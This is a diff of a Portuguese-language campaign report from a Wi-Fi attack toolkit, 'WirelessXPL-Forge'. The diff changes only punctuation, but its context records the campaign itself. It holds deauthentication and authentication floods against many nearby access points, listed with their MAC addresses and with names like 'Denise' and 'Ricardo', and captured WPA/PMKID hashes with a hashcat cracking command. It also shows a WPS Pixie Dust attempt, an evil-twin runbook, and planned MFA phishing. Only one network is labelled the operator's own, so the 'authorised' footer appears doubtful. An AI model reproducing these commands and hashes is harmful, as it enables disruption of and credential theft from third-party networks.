@@ -1,10 +1,10 @@
-# WirelessXPL-Forge v1.2.0 — Relatório de Campanha Massiva
+# WirelessXPL-Forge v1.2.0 - Relatório de Campanha Massiva
 
-**Data:** 2026-05-03 19:08–19:26 UTC-3  
+**Data:** 2026-05-03 19:08-19:26 UTC-3  
 **Duração total:** ~18 minutos  
 **Adaptador:** Ralink RT5370 USB via usbipd → WSL2 kernel `6.6.87.2-microsoft-standard-WSL2+`  
 **Interface:** `wlx24050f3d5f0a` | Packet Injection: 36%  
-**Modo de operação:** WirelessXPL-Forge CLI (`use` → `set` → `run`) — 19 fases executadas  
+**Modo de operação:** WirelessXPL-Forge CLI (`use` → `set` → `run`) - 19 fases executadas  
 
 ---
 
@@ -18,7 +18,7 @@
 | PMKIDs coletados (hcxdumptool) | **4 hashes** (arquivo `/tmp/pmkid_hashes.txt`) |
 | Deauth enviados | **16 redes × 5-15 frames = 100+ deauths** |
 | Auth flood | **2.619+ pacotes @ 1.096 pkt/s contra 8 APs** |
-| Conexão em rede aberta | **#CLARO-WIFI — captive portal bloqueou DHCP** |
+| Conexão em rede aberta | **#CLARO-WIFI - captive portal bloqueou DHCP** |
 | Evil Twin runbook | **Gerado:** `wxf_evil_twin_runbook/` |
 | Erros corrigidos inline | **4** (hcxdumptool v6.3, pmkid_autopwn indent, paths) |
 
@@ -94,7 +94,7 @@ msf6 exploit > run                          # FASE 19 (bug require_authorised_la
 
 ---
 
-## 3. Handshake Captures — 16 Redes
+## 3. Handshake Captures - 16 Redes
 
 | Arquivo | Rede | Status |
 |---|---|---|
@@ -117,23 +117,23 @@ msf6 exploit > run                          # FASE 19 (bug require_authorised_la
 
 **Nota sobre "0 handshake"**: O airodump capturou os arquivos, mas o handshake EAPOL completo não foi detectado pelo aircrack-ng nos `.cap` curtos (15-30s). Os PMKIDs completos estão no arquivo `/tmp/pmkid_all.pcapng` do hcxdumptool (Fase 3).
 
-**Handshake EAPOL completo confirmado anteriormente**: UNIAOGEEK (WPA*02 — hcxdumptool Fase anterior)
+**Handshake EAPOL completo confirmado anteriormente**: UNIAOGEEK (WPA*02 - hcxdumptool Fase anterior)
 
 ---
 
 ## 4. PMKIDs Capturados
 
 ```
-# UNIAOGEEK — EAPOL handshake completo (WPA*02) — rede própria
+# UNIAOGEEK - EAPOL handshake completo (WPA*02) - rede própria
 WPA*02*1e949295a285576cb2fd23f98e71ec1e*724e6b1acb90*9649b470c915*554e49414f4745454b*...
 
-# Denise 2 — PMKID  
+# Denise 2 - PMKID  
 WPA*01*d06e6e11988009fb7f15374d001a9ba0*78321b6546e4*d85dfb17cdc1*44656e6973652032***
 
-# Denise — PMKID
+# Denise - PMKID
 WPA*01*5a402b2e419317e119b540824af9964d*e820e2060f4b*d85dfb17cdc1*44656e697365***
 
-# NET_2G060F46-IoT — PMKID
+# NET_2G060F46-IoT - PMKID
 WPA*01*495ac3e4919f6d54ac9a77630154d5d2*ea20e206104e*d85dfb17cdc1*4e45545f32473036304634362d496f54***
 ```
 
@@ -144,24 +144,24 @@ hashcat -m 22000 /tmp/pmkid_hashes.txt /usr/share/wordlists/rockyou.txt
 
 ---
 
-## 5. Auth Flood — Resultado
+## 5. Auth Flood - Resultado
 
 ```
 Packets sent: 2619 @ 1096 packets/sec
 Target APs encontrados automaticamente:
-  - 3A:6B:1C:2F:DD:B8 (hidden)
-  - A2:40:6F:E5:26:D4 (Teixeira)
-  - 4C:19:5D:CC:AE:58 (unknown)
-  - E8:20:E2:06:0F:4B (Denise)
-  - EA:20:E2:06:10:4C (#CLARO-WIFI)
-  - 84:01:12:BF:F4:3D (Ricardo)
-  - 20:35:43:59:6C:1C (APT1104C_2G)
-  - 30:93:BC:4B:67:68 (unknown)
+ - 3A:6B:1C:2F:DD:B8 (hidden)
+ - A2:40:6F:E5:26:D4 (Teixeira)
+ - 4C:19:5D:CC:AE:58 (unknown)
+ - E8:20:E2:06:0F:4B (Denise)
+ - EA:20:E2:06:10:4C (#CLARO-WIFI)
+ - 84:01:12:BF:F4:3D (Ricardo)
+ - 20:35:43:59:6C:1C (APT1104C_2G)
+ - 30:93:BC:4B:67:68 (unknown)
 ```
 
 ---
 
-## 6. WPS Pixie Dust — 1-708 (WPS 1.0)
+## 6. WPS Pixie Dust - 1-708 (WPS 1.0)
 
 ```
 use generic/wifi_lab/wps_multimode
@@ -171,7 +171,7 @@ run
 
 [+] Received beacon from 44:3B:32:B2:CF:81 (Realtek, WPS 1.0)
 [*] Launching Pixie Dust via reaver -K 1...
-[-] Pixie Dust timeout reached (60s) — PIN não extraído
+[-] Pixie Dust timeout reached (60s) - PIN não extraído
 Status: AP respondeu beacons mas não completou WPS M1-M7 exchange
 Diagnóstico: AP pode ter proteção anti-brute adicional
 Recomendação: aumentar timeout, tentar bully -d
@@ -179,7 +179,7 @@ Recomendação: aumentar timeout, tentar bully -d
 
 ---
 
-## 7. Evil Twin — Runbook Gerado
+## 7. Evil Twin - Runbook Gerado
 
 ```
 use generic/wifi_lab/evil_twin_workflow  
@@ -187,8 +187,8 @@ set target_bssid 72:4E:6B:1A:CB:90
 run
 
 [+] Runbook gerado em: wxf_evil_twin_runbook/
-    - hostapd_evil_twin.conf
-    - dnsmasq_evil_twin.conf
+ - hostapd_evil_twin.conf
+ - dnsmasq_evil_twin.conf
     
 Próximos passos manuais:
   1. hostapd wxf_evil_twin_runbook/hostapd_evil_twin.conf
@@ -199,7 +199,7 @@ Próximos passos manuais:
 
 ---
 
-## 8. #CLARO-WIFI — Rede Aberta
+## 8. #CLARO-WIFI - Rede Aberta
 
 ```
 use generic/wifi_lab/connectivity_portal
@@ -211,7 +211,7 @@ run
 
 Resultado: Associação OK, DHCP bloqueado por captive portal
 IP obtido: 169.254.98.83 (link-local apenas)
-Internet: NÃO — requer login Claro
+Internet: NÃO - requer login Claro
 Hosts internos: scan indisponível sem IP válido
 ```
 
@@ -285,7 +285,7 @@ use generic/wifi_lab/mfa_phishing_portal  # capturar MFA
 
 ### WPS (prioridade 3)
 ```bash
-# 1-708 WPS 1.0 — aumentar timeout
+# 1-708 WPS 1.0 - aumentar timeout
 use generic/wifi_lab/wps_multimode
 set target_bssid 44:3B:32:B2:CF:81
 set mode pixie_dust
@@ -295,5 +295,5 @@ run
 
 ---
 
-*Relatório gerado por WirelessXPL-Forge v1.2.0 — União Geek*  
+*Relatório gerado por WirelessXPL-Forge v1.2.0 - União Geek*  
 *Campanha executada com I_KNOW_SCOPE=true em ambiente autorizado*
